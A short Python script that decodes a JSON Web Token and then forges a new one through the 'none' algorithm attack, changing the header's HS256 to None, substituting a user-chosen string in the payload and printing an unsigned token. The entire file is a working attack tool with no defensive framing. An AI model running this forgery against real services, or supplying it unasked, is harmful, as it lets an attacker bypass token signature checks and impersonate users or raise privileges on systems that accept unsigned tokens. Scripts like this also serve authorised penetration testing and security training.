import base64
import json

# Colors
RED = '\033[0;31m'
GREEN = '\033[0;32m'
BLUE = '\033[0;34m'
NC = '\033[0m'  # No Color

def main():
    print(f"{GREEN}Provide the JWT{NC}")
    jwt = input("JWT: ")
    print(f"\n{GREEN}Decoded JWT:{NC}")

    def jwt_decode(jwt):
        header = jwt.split('.')[0]
        payload = jwt.split('.')[1]
        print(json.dumps(json.loads(base64.urlsafe_b64decode(header + '==').decode('utf-8')), indent=4))
        print(json.dumps(json.loads(base64.urlsafe_b64decode(payload + '==').decode('utf-8')), indent=4))

    jwt_decode(jwt)

    print(f"\n{GREEN}None Algorithm Attack Configuration{NC}")
    search_str = input("Enter the string to replace in the payload: ")
    replace_str = input("Enter the replacement string: ")

    def none_alg_attack(jwt, search_str, replace_str):
        header = jwt.split('.')[0]
        payload = jwt.split('.')[1]

        decoded_header = base64.urlsafe_b64decode(header + '==').decode('utf-8').replace("HS256", "None")
        step1 = base64.urlsafe_b64encode(decoded_header.encode()).decode().rstrip("=")

        decoded_payload = base64.urlsafe_b64decode(payload + '==').decode('utf-8').replace(search_str, replace_str)
        step2 = base64.urlsafe_b64encode(decoded_payload.encode()).decode().rstrip("=")

        modified_jwt = f"{step1}.{step2}."
        final_jwt = modified_jwt
        print(f"{GREEN}Final JWT: {NC}{final_jwt}")

    none_alg_attack(jwt, search_str, replace_str)

if __name__ == "__main__":
    main()
